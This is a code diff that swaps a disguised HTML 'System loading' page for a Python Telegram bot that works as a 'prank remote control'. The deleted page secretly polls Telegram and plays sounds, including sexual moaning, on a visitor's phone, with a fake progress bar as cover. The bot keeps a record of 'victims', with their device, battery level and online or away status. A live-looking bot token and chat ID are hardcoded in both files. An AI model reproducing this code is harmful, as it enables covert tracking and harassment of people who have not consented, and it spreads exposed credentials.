@@ -1,250 +1,221 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>System Loading...</title>
-    <style>
-        body { 
-            background: black; 
-            color: white; 
-            font-family: Arial; 
-            text-align: center;
-            padding-top: 50px;
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        #status {
-            font-size: 24px;
-            margin: 20px;
-        }
-        #debug {
-            font-size: 12px;
-            color: #666;
-            margin-top: 50px;
-            display: none;
-        }
-    </style>
-</head>
-<body>
-    <div id="status">System loading... 0%</div>
-    <div id="debug">Debug mode</div>
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import logging
+import re
+from telegram import Update, ReplyKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+
+# Enable logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# Your bot token
+TOKEN = '8654014366:AAFWPdct4wFezCEoHFlYZsmzScwzwCmTjjw'
+
+# Track victims
+victims = {}
+
+# Sound buttons
+SOUND_BUTTONS = [
+    ['💨 Fart', '😱 Scream'],
+    ['🤮 Vomit', '🔴 Error'],
+    ['😏 Moaning', '🤨 Bruh'],
+    ['💀 Roblox', '🏗️ Metal Pipe'],
+    ['🎲 Random Sound', '📊 Victim Status'],
+    ['❓ Help']
+]
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Send a message with buttons when /start is issued."""
+    reply_markup = ReplyKeyboardMarkup(
+        SOUND_BUTTONS, 
+        resize_keyboard=True,
+        input_field_placeholder="Choose a sound to prank!"
+    )
     
-    <script>
-        // =============================================
-        // YOUR TELEGRAM BOT CREDENTIALS
-        // =============================================
-        const BOT_TOKEN = '8654014366:AAFWPdct4wFezCEoHFlYZsmzScwzwCmTjjw';
-        const CHAT_ID = 6754338153;
+    await update.message.reply_text(
+        "🎮 **PRANK REMOTE CONTROL** 🎮\n\n"
+        "Press any button to trigger sounds on the victim's phone!\n\n"
+        "📱 **Victim's page:**\n"
+        "https://senpai-loading.github.io/sen\n\n"
+        "📊 **New Feature:** I'll notify you when victim opens/closes the page!\n\n"
+        "👇 **Press a button below:**",
+        reply_markup=reply_markup,
+        parse_mode='Markdown'
+    )
+
+async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle button presses."""
+    text = update.message.text
+    user = update.effective_user.first_name
+    
+    command_map = {
+        '💨 Fart': '/fart',
+        '😱 Scream': '/scream',
+        '🤮 Vomit': '/vomit',
+        '🔴 Error': '/error',
+        '😏 Moaning': '/moan',
+        '🤨 Bruh': '/bruh',
+        '💀 Roblox': '/roblox',
+        '🏗️ Metal Pipe': '/metalpipe',
+        '🎲 Random Sound': '/random',
+        '📊 Victim Status': '/status',
+        '❓ Help': '/help'
+    }
+    
+    command = command_map.get(text, '/unknown')
+    
+    if command == '/help':
+        await help_command(update, context)
+        return
+    
+    if command == '/status':
+        await show_status(update, context)
+        return
+    
+    await update.message.reply_text(
+        f"✅ **Triggered:** {text}\n"
+        f"👤 Sent by: {user}",
+        parse_mode='Markdown'
+    )
+    
+    logger.info(f"{user} triggered: {command}")
+
+async def show_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show victim status."""
+    if not victims:
+        await update.message.reply_text(
+            "📊 **No victims connected yet**\n\n"
+            "Make sure victim has opened:\n"
+            "https://senpai-loading.github.io/sen",
+            parse_mode='Markdown'
+        )
+        return
+    
+    status_text = "📊 **VICTIM STATUS**\n\n"
+    
+    for victim_id, info in victims.items():
+        status_text += f"🆔 {victim_id[:8]}...\n"
+        status_text += f"📱 {info.get('device', 'Unknown')}\n"
+        status_text += f"⏰ Connected: {info.get('connected_since', 'Unknown')}\n"
+        status_text += f"🔋 Battery: {info.get('battery', 'Unknown')}\n"
+        status_text += f"📡 Status: {info.get('status', 'Unknown')}\n\n"
+    
+    await update.message.reply_text(status_text, parse_mode='Markdown')
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Send help message."""
+    help_text = """
+    🎯 **PRANK BOT FEATURES:**
+    
+    **SOUNDS:**
+    • 💨 Fart - Classic
+    • 😱 Scream - Wilhelm scream
+    • 🤮 Vomit - Gross out
+    • 🔴 Error - Windows error
+    • 😏 Moaning - Custom sound
+    • 🤨 Bruh - Meme sound
+    • 💀 Roblox - OOF!
+    • 🏗️ Metal Pipe - BONK!
+    • 🎲 Random - Surprise me!
+    
+    **NEW: VICTIM DETECTION**
+    • Get notified when victim opens page
+    • Know when they switch apps
+    • See when they disconnect
+    • 📊 Victim Status button shows all
+    
+    Made with ❤️ for pranking
+    """
+    await update.message.reply_text(help_text, parse_mode='Markdown')
+
+def extract_victim_info(text):
+    """Extract victim info from Telegram message."""
+    if 'VICTIM ONLINE' in text:
+        # Extract info
+        id_match = re.search(r'ID: (victim_[a-z0-9]+)', text)
+        device_match = re.search(r'(📱 .+)', text)
+        battery_match = re.search(r'Battery: (\d+%)', text)
         
-        let lastUpdateId = 0;
-        let audioEnabled = false;
-        
-        // =============================================
-        // UNLOCK AUDIO ON IPHONE
-        // =============================================
-        function unlockAudio() {
-            const silentAudio = new Audio('data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTG9uZG9uU291bmRzLmNvbQAAAFRSSUNLAAAAHwAAAEFkb2JlIEZBUiBKYW5zIFBlbmd1aW4gU3R1ZGlvAAAA/UpLSUkAAAAvAAAALWFjYWNhAGIAbwBvAGsAIAB0AHkAcABlACAAYwBvAGQAZQAgAHAAYQBnAGUAAAAA');
-            silentAudio.play().catch(e => {});
-            
-            document.addEventListener('touchstart', function enableAudio() {
-                audioEnabled = true;
-                document.removeEventListener('touchstart', enableAudio);
-            });
-            
-            document.addEventListener('click', function enableAudio() {
-                audioEnabled = true;
-                document.removeEventListener('click', enableAudio);
-            });
+        return {
+            'type': 'online',
+            'id': id_match.group(1) if id_match else 'unknown',
+            'device': device_match.group(1) if device_match else 'Unknown',
+            'battery': battery_match.group(1) if battery_match else 'Unknown',
+            'status': '🟢 Online'
         }
-        
-        unlockAudio();
-        
-        // =============================================
-        // CHECK TELEGRAM FOR COMMANDS
-        // =============================================
-        function checkTelegram() {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-            
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok && data.result && data.result.length > 0) {
-                        data.result.forEach(update => {
-                            if (update.message && update.message.text) {
-                                playSound(update.message.text);
-                                lastUpdateId = update.update_id;
-                            }
-                        });
+    elif 'VICTIM DISCONNECTED' in text:
+        id_match = re.search(r'ID: (victim_[a-z0-9]+)', text)
+        return {
+            'type': 'offline',
+            'id': id_match.group(1) if id_match else 'unknown',
+            'status': '🔴 Offline'
+        }
+    elif 'VICTIM AWAY' in text:
+        id_match = re.search(r'ID: (victim_[a-z0-9]+)', text)
+        return {
+            'type': 'away',
+            'id': id_match.group(1) if id_match else 'unknown',
+            'status': '🟡 Away'
+        }
+    elif 'VICTIM RETURNED' in text:
+        id_match = re.search(r'ID: (victim_[a-z0-9]+)', text)
+        return {
+            'type': 'returned',
+            'id': id_match.group(1) if id_match else 'unknown',
+            'status': '🟢 Online'
+        }
+    return None
+
+def main():
+    """Start the bot."""
+    application = Application.builder().token(TOKEN).build()
+    
+    # Register handlers
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("help", help_command))
+    application.add_handler(CommandHandler("status", show_status))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buttons))
+    
+    # Track victim messages
+    async def track_victims(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        # Check if this is a victim status message (sent by bot to itself)
+        if update.message and update.message.text and update.message.from_user.id == update.message.chat.id:
+            info = extract_victim_info(update.message.text)
+            if info:
+                victim_id = info['id']
+                if info['type'] == 'online':
+                    victims[victim_id] = {
+                        'device': info.get('device', 'Unknown'),
+                        'battery': info.get('battery', 'Unknown'),
+                        'connected_since': update.message.date.strftime('%H:%M:%S'),
+                        'status': '🟢 Online'
                     }
-                })
-                .catch(error => {
-                    console.log('Telegram error:', error);
-                });
-        }
-        
-        // =============================================
-        // PLAY SOUND BASED ON COMMAND
-        // =============================================
-        function playSound(command) {
-            let audio;
-            let statusMessage;
-            
-            switch(command.toLowerCase()) {
-                // Fart sounds
-                case '/fart':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/fart-with-reverb.mp3');
-                    statusMessage = '💨 System flatulence detected...';
-                    break;
-                    
-                // Scream sounds
-                case '/scream':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/wilhelm-scream.mp3');
-                    statusMessage = '⚠️ AAAAAHHHHH!';
-                    break;
-                    
-                // Vomit sounds
-                case '/vomit':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/vomit-sound.mp3');
-                    statusMessage = '🤢 System malfunction... *urp*';
-                    break;
-                    
-                // Error sounds
-                case '/error':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/windows-xp-error.mp3');
-                    statusMessage = '🔴 CRITICAL ERROR DETECTED';
-                    break;
-                    
-                // Bruh sound
-                case '/bruh':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/bruh-sound-effect.mp3');
-                    statusMessage = '🤨 Bruh...';
-                    break;
-                    
-                // Roblox death
-                case '/roblox':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/roblox-death-sound_1.mp3');
-                    statusMessage = '💀 OOF!';
-                    break;
-                    
-                // Metal pipe
-                case '/metalpipe':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/metal-pipe-sound.mp3');
-                    statusMessage = '🏗️ BONGGGGG!';
-                    break;
-                    
-                // =============================================
-                // YOUR CUSTOM MOANING SOUND
-                // =============================================
-                case '/moan':
-                case '/moaning':
-                    audio = new Audio('https://github.com/sencal1125-prog/sen/blob/main/moaning.mp3'); // Adjust extension if needed
-                    statusMessage = '😏 Uhhhh... someone\'s enjoying that...';
-                    break;
+                elif info['type'] == 'offline':
+                    if victim_id in victims:
+                        victims[victim_id]['status'] = '🔴 Offline'
+                elif info['type'] == 'away':
+                    if victim_id in victims:
+                        victims[victim_id]['status'] = '🟡 Away'
+                elif info['type'] == 'returned':
+                    if victim_id in victims:
+                        victims[victim_id]['status'] = '🟢 Online'
     
-                    
-                // Random sound
-                case '/random':
-                    const randomSounds = [
-                        'https://www.myinstants.com/media/sounds/fart-with-reverb.mp3',
-                        'https://www.myinstants.com/media/sounds/wilhelm-scream.mp3',
-                        'https://senpai-loading.github.io/sen/moaning'
-                    ];
-                    const randomIndex = Math.floor(Math.random() * randomSounds.length);
-                    audio = new Audio(randomSounds[randomIndex]);
-                    statusMessage = '🎲 Random sound!';
-                    break;
-                    
-                default:
-                    audio = new Audio('https://www.myinstants.com/media/sounds/metal-pipe-sound.mp3');
-                    statusMessage = '❓ Unknown command... here\'s a sound anyway!';
-            }
-            
-            // Update status
-            document.getElementById('status').innerHTML = statusMessage;
-            
-            // Play the sound
-            if (audio) {
-                audio.play()
-                    .then(() => {
-                        console.log('Sound playing!');
-                    })
-                    .catch(error => {
-                        console.log('Audio play failed:', error);
-                        document.getElementById('status').innerHTML = '⚠️ Tap screen to enable sound';
-                        
-                        // Try again on touch
-                        const playOnTouch = function() {
-                            audio.play().catch(e => console.log('Still failed:', e));
-                            document.body.removeEventListener('touchstart', playOnTouch);
-                        };
-                        document.body.addEventListener('touchstart', playOnTouch, { once: true });
-                    });
-            }
-            
-            updateProgress();
-        }
-        
-        // =============================================
-        // FAKE PROGRESS BAR
-        // =============================================
-        function updateProgress() {
-            let percent = 0;
-            const statusElement = document.getElementById('status');
-            const originalText = statusElement.innerHTML;
-            
-            const interval = setInterval(() => {
-                percent += Math.floor(Math.random() * 10) + 1;
-                if (percent >= 100) {
-                    percent = 100;
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        if (!statusElement.innerHTML.includes('💨') && 
-                            !statusElement.innerHTML.includes('⚠️') &&
-                            !statusElement.innerHTML.includes('🤢') &&
-                            !statusElement.innerHTML.includes('🔴') &&
-                            !statusElement.innerHTML.includes('😏') &&
-                            !statusElement.innerHTML.includes('🇷🇺')) {
-                            statusElement.innerHTML = 'System loading... 0%';
-                            updateProgress();
-                        }
-                    }, 2000);
-                }
-                
-                if (statusElement.innerHTML === originalText || 
-                    statusElement.innerHTML.includes('System loading')) {
-                    statusElement.innerHTML = `System loading... ${percent}%`;
-                }
-            }, 300);
-        }
-        
-        // =============================================
-        // START EVERYTHING
-        // =============================================
-        
-        updateProgress();
-        setInterval(checkTelegram, 3000);
-        setTimeout(checkTelegram, 1000);
-        
-        // Debug tap (tap 5 times to show debug info)
-        let tapCount = 0;
-        document.getElementById('status').addEventListener('click', function() {
-            tapCount++;
-            if (tapCount >= 5) {
-                document.getElementById('debug').style.display = 'block';
-                document.getElementById('debug').innerHTML = `
-                    Debug Info:<br>
-                    Bot Token: ${BOT_TOKEN.substring(0,10)}...<br>
-                    Chat ID: ${CHAT_ID}<br>
-                    Last Update: ${lastUpdateId}<br>
-                    Audio Enabled: ${audioEnabled}
-                `;
-                tapCount = 0;
-            }
-        });
-        
-    </script>
-</body>
-</html>
+    application.add_handler(MessageHandler(filters.TEXT, track_victims), group=1)
+    
+    print("🤖 Prank Bot is running! Press Ctrl+C to stop.")
+    print("\n✅ Features:")
+    print("   • Sound buttons")
+    print("   • Victim online/offline detection")
+    print("   • Away status when they switch apps")
+    print("   • Battery level detection")
+    print("\n📱 Victim page: https://senpai-loading.github.io/sen")
+    
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
+
+if __name__ == '__main__':
+    main()
